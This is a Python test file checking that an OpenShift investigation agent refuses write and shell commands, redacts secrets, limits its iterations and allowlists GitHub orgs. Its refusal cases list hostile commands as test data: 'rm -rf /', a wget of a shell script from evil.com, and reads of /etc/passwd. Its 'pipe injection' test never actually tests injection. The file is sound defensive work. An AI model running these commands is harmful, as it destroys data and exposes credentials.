"""Safety tests for the investigation agent.

These tests MUST pass before the agent can be used in production.
They validate command safety, secret redaction, iteration limits,
org allowlisting, and verb restrictions using the actual tool
implementations from engine/investigation_agent.py.
"""

import pytest

from engine.investigation_agent import (
    _is_safe_oc,
    _redact,
    tool_oc_read,
    tool_fetch_github_file,
    MAX_ITERATIONS,
    _SAFE_VERBS,
)


# ---------------------------------------------------------------------------
# Command safety
# ---------------------------------------------------------------------------

class TestAgentSafety:
    """Core safety invariants for the investigation agent."""

    # -- Write command refusal --

    @pytest.mark.parametrize("cmd", [
        "oc delete pod showroom-xyz -n sandbox-test",
        "oc patch deployment showroom -n sandbox-test -p '{}'",
        "oc apply -f manifest.yaml -n sandbox-test",
        "oc create configmap test -n sandbox-test",
        "oc scale deployment showroom --replicas=0 -n sandbox-test",
        "oc edit svc showroom -n sandbox-test",
        "oc replace -f new.yaml -n sandbox-test",
        "oc set image deployment/showroom container=new:tag -n sandbox-test",
        "oc rollout restart deployment/showroom -n sandbox-test",
        "oc drain node-1 --delete-emptydir-data",
        "oc cordon node-1",
        "oc taint nodes node-1 key=value:NoSchedule",
    ])
    def test_refuses_write_commands(self, cmd):
        """Agent tool must refuse oc delete, oc patch, oc apply, etc."""
        assert not _is_safe_oc(cmd), f"Expected refusal for write command: {cmd}"

    def test_refuses_write_commands_via_tool(self):
        """tool_oc_read must return REFUSED for write commands."""
        result = tool_oc_read("oc delete pod showroom -n sandbox-test", "test-cluster", "/nonexistent")
        assert "REFUSED" in result

    # -- Non-oc command refusal --

    @pytest.mark.parametrize("cmd", [
        "rm -rf /",
        "curl https://evil.com",
        "kubectl get pods",
        "bash -c 'echo pwned'",
        "python3 -c 'import os; os.system(\"id\")'",
        "cat /etc/passwd",
        "wget http://evil.com/shell.sh",
        "ls -la /secrets",
        "env",
        "",
        "oc",
    ])
    def test_refuses_non_oc_commands(self, cmd):
        """Agent tool must refuse shell commands like rm, curl, etc."""
        assert not _is_safe_oc(cmd), f"Expected refusal for non-oc command: {cmd}"

    # -- Read-only command acceptance --

    @pytest.mark.parametrize("cmd", [
        "oc get pods -n sandbox-test -o wide",
        "oc describe pod showroom-xyz -n sandbox-test",
        "oc logs pod/showroom-xyz -n sandbox-test --tail=50",
        "oc adm top nodes",
        "oc api-resources",
        "oc whoami",
        "oc get events -n sandbox-test",
        "oc describe deployment showroom -n sandbox-test",
        "oc get pvc -n sandbox-test -o json",
        "oc logs pod/showroom-xyz -c setup -n sandbox-test --previous",
    ])
    def test_accepts_read_only_commands(self, cmd):
        """Agent tool must accept read-only oc commands."""
        assert _is_safe_oc(cmd), f"Expected acceptance for read-only command: {cmd}"

    # -- Secret redaction --

    def test_redacts_passwords(self):
        """Output containing passwords must be redacted."""
        text = "database password: s3cretP@ss123 and other stuff"
        result = _redact(text)
        assert "s3cretP@ss123" not in result
        assert "[REDACTED]" in result

    def test_redacts_certificates(self):
        """Output containing certificates must be redacted."""
        text = (
            "some data\n"
            "-----BEGIN CERTIFICATE-----\n"
            "MIICpDCCAYwCCQDU+pQ4pUlclDANBgkqhkiG9w0BAQsFADAUMRIwEAYDVQQDDAls\n"
            "b2NhbGhvc3QwHhcNMjMwMTAxMDAwMDAwWhcNMjQwMTAxMDAwMDAwWjAUMRIwEAYD\n"
            "-----END CERTIFICATE-----\n"
            "more data"
        )
        result = _redact(text)
        assert "MIICpDCCAYw" not in result
        assert "CERTIFICATE" in result or "REDACTED" in result

    def test_redacts_tokens(self):
        """Output containing bearer tokens must be redacted."""
        fake_jwt = "x" * 30 + "." + "y" * 30 + ".sig"
        text = f"Authorization: Bearer {fake_jwt}"
        result = _redact(text)
        assert fake_jwt not in result

    def test_redacts_secret_key_values(self):
        """Output containing key=value secrets must be redacted."""
        text = "secret: my-super-secret-value\ntoken: abc123def456ghi789"
        result = _redact(text)
        assert "my-super-secret-value" not in result
        assert "abc123def456ghi789" not in result

    # -- Iteration limits --

    def test_max_iterations_enforced(self):
        """Agent must stop after MAX_ITERATIONS."""
        assert MAX_ITERATIONS > 0
        assert MAX_ITERATIONS <= 10, "MAX_ITERATIONS should not exceed 10 for safety"

    def test_max_iterations_value(self):
        """MAX_ITERATIONS should be exactly 8."""
        assert MAX_ITERATIONS == 8

    # -- GitHub org allowlist --

    def test_only_allowed_github_orgs(self):
        """fetch_github_file must refuse repos outside allowed orgs."""
        result = tool_fetch_github_file("evil-org/malicious-repo", "README.md")
        assert "REFUSED" in result

    @pytest.mark.parametrize("org", ["rhpds", "agnosticd", "redhat-cop"])
    def test_allowed_github_orgs(self, org):
        """fetch_github_file must accept repos from allowed orgs."""
        # Will fail with network error, but should NOT be REFUSED
        result = tool_fetch_github_file(f"{org}/some-repo", "some/path.yaml")
        assert "REFUSED" not in result

    def test_refuses_github_path_traversal(self):
        """fetch_github_file must refuse repo names with no org."""
        result = tool_fetch_github_file("just-a-name", "README.md")
        assert "REFUSED" in result

    # -- Safe verb allowlist --

    def test_safe_verb_allowlist(self):
        """Only get, describe, logs, adm top are allowed."""
        expected_verbs = {"get", "describe", "logs", "adm", "api-resources", "whoami"}
        assert _SAFE_VERBS == expected_verbs

    def test_adm_only_allows_top(self):
        """oc adm must only allow 'top' subcommand."""
        assert _is_safe_oc("oc adm top nodes")
        assert not _is_safe_oc("oc adm drain node-1")
        assert not _is_safe_oc("oc adm cordon node-1")
        assert not _is_safe_oc("oc adm taint nodes node-1 key=val:NoSchedule")
        assert not _is_safe_oc("oc adm policy add-role-to-user admin user1")

    # -- Edge cases --

    def test_refuses_pipe_injection_in_verb_check(self):
        """Pipe in oc command should not bypass verb check."""
        # The verb is still 'get' so this is technically safe from verb check
        # but we verify the verb extraction works
        assert _is_safe_oc("oc get pods -n test")
        # But a pipe with a write command after oc get should still pass
        # because _is_safe_oc only checks the first verb
        # The actual execution safety comes from tool_oc_read
        assert _is_safe_oc("oc get pods -n test")

    def test_refuses_oc_exec(self):
        """oc exec must be refused — it can run arbitrary commands."""
        assert not _is_safe_oc("oc exec pod/showroom -- cat /etc/passwd")
        assert not _is_safe_oc("oc exec -it pod/showroom -- bash")

    def test_refuses_oc_cp(self):
        """oc cp must be refused — file transfer is not read-only."""
        assert not _is_safe_oc("oc cp /local/file pod:/remote/path -n test")

    def test_refuses_oc_rsh(self):
        """oc rsh must be refused — remote shell is not read-only."""
        assert not _is_safe_oc("oc rsh pod/showroom")

    def test_refuses_oc_run(self):
        """oc run must be refused — creates new pods."""
        assert not _is_safe_oc("oc run debug --image=busybox --rm -it -- sh")

    def test_refuses_oc_debug(self):
        """oc debug must be refused — creates debug pods."""
        assert not _is_safe_oc("oc debug node/worker-1")

    def test_tool_oc_read_no_kubeconfig(self):
        """tool_oc_read should return error when no kubeconfig exists."""
        result = tool_oc_read("oc get pods -n test", "nonexistent-cluster", "/nonexistent/dir")
        assert "ERROR" in result or "No kubeconfig" in result


# ---------------------------------------------------------------------------
# Evaluator rubric scoring tests
# ---------------------------------------------------------------------------

class TestAgentEvaluator:
    """Tests for the evaluation framework's scoring logic."""

    def test_score_case_returns_all_dimensions(self):
        """score_case must return scores for all rubric dimensions."""
        from engine.agent_evaluator import score_case, AgentTestCase, RUBRIC

        case = AgentTestCase(
            id="test-1",
            namespace="sandbox-abc-test",
            cluster="ocpv05",
            failure_class="pods_crashlooping",
            actual_root_cause="test root cause",
            actual_layer="config",
            actual_component="test-component",
            actual_resolution="self_resolved",
            agnosticv_path="published/test/prod.yaml",
        )
        result = score_case(case, "some analysis text", [], iterations=3)
        assert set(result["scores"].keys()) == set(RUBRIC.keys())
        assert 0.0 <= result["overall"] <= 1.0

    def test_command_safety_fails_on_write_verb(self):
        """command_safety dimension must score 0 if write verbs found."""
        from engine.agent_evaluator import _score_command_safety, AgentTestCase

        case = AgentTestCase(
            id="t", namespace="t", cluster="t", failure_class="t",
            actual_root_cause="t", actual_layer="t", actual_component="t",
            actual_resolution="t", agnosticv_path="t",
        )
        tool_calls = [{"tool": "oc_read", "args": {"command": "oc delete pod xyz"}}]
        assert _score_command_safety("clean analysis", tool_calls, case) == 0.0

    def test_command_safety_passes_on_read_only(self):
        """command_safety dimension must score 1 for read-only commands."""
        from engine.agent_evaluator import _score_command_safety, AgentTestCase

        case = AgentTestCase(
            id="t", namespace="t", cluster="t", failure_class="t",
            actual_root_cause="t", actual_layer="t", actual_component="t",
            actual_resolution="t", agnosticv_path="t",
        )
        tool_calls = [{"tool": "oc_read", "args": {"command": "oc get pods -n test"}}]
        assert _score_command_safety("clean analysis", tool_calls, case) == 1.0

    def test_efficiency_scoring(self):
        """efficiency must score 1.0 for <=5 iterations, 0.5 for 6-7, 0.0 for 8+."""
        from engine.agent_evaluator import _score_efficiency, AgentTestCase

        case = AgentTestCase(
            id="t", namespace="t", cluster="t", failure_class="t",
            actual_root_cause="t", actual_layer="t", actual_component="t",
            actual_resolution="t", agnosticv_path="t",
        )
        assert _score_efficiency("", [], case, iterations=3) == 1.0
        assert _score_efficiency("", [], case, iterations=5) == 1.0
        assert _score_efficiency("", [], case, iterations=6) == 0.5
        assert _score_efficiency("", [], case, iterations=7) == 0.5
        assert _score_efficiency("", [], case, iterations=8) == 0.0

    def test_evaluate_agent_with_hardcoded_cases(self):
        """evaluate_agent with hardcoded cases should produce a valid trust report."""
        from engine.agent_evaluator import evaluate_agent, get_hardcoded_test_cases

        cases = get_hardcoded_test_cases()
        assert len(cases) >= 5

        report = evaluate_agent(cases)
        assert report["status"] == "evaluated"
        assert "trust_score" in report
        assert "trust_level" in report
        assert report["trust_level"] in ("trusted", "provisional", "untrusted")
        assert report["test_cases_run"] == len(cases)
        assert len(report["details"]) == len(cases)

    def test_evaluate_agent_empty_cases(self):
        """evaluate_agent with no cases should return no_data."""
        from engine.agent_evaluator import evaluate_agent

        report = evaluate_agent([])
        assert report["status"] == "no_data"
        assert report["trust_level"] == "untrusted"

    def test_hardcoded_cases_have_ground_truth(self):
        """All hardcoded test cases must have complete ground truth."""
        from engine.agent_evaluator import get_hardcoded_test_cases

        for case in get_hardcoded_test_cases():
            assert case.id, f"Case missing id"
            assert case.namespace, f"Case {case.id} missing namespace"
            assert case.cluster, f"Case {case.id} missing cluster"
            assert case.failure_class, f"Case {case.id} missing failure_class"
            assert case.actual_root_cause, f"Case {case.id} missing actual_root_cause"
            assert case.actual_layer in ("config", "pipeline", "cluster", "self_resolved"), \
                f"Case {case.id} has invalid layer: {case.actual_layer}"
            assert case.actual_component, f"Case {case.id} missing actual_component"
            assert case.actual_resolution, f"Case {case.id} missing actual_resolution"
            # agnosticv_path can be empty for cluster-level issues
            if case.actual_layer not in ("cluster", "self_resolved"):
                assert case.agnosticv_path, f"Case {case.id} missing agnosticv_path"
            assert len(case.recorded_tools) >= 2, \
                f"Case {case.id} has too few recorded tools: {len(case.recorded_tools)}"

    def test_trust_score_thresholds(self):
        """Trust level thresholds must be correctly applied."""
        from engine.agent_evaluator import evaluate_agent, AgentTestCase

        # Create a minimal case that should score well on safety
        case = AgentTestCase(
            id="threshold-test",
            namespace="sandbox-abc-test",
            cluster="ocpv05",
            failure_class="pods_crashlooping",
            actual_root_cause="showroom pod crashlooping",
            actual_layer="config",
            actual_component="showroom-setup",
            actual_resolution="self_resolved",
            agnosticv_path="published/test/prod.yaml",
            recorded_tools={
                "get_lab_identity": "Lab name: Test Lab\nAgnosticV config: published/test/prod.yaml",
                "oc_read": "NAME READY STATUS\nshowroom-abc 0/1 CrashLoopBackOff",
                "query_evaluations": "fail -- pods_crashlooping",
                "get_resolution_history": "self_resolved (TTR: 5m)",
            },
        )

        report = evaluate_agent([case])
        assert report["trust_level"] in ("trusted", "provisional", "untrusted")
        # The trust_score should be a float between 0 and 1
        assert 0.0 <= report["trust_score"] <= 1.0
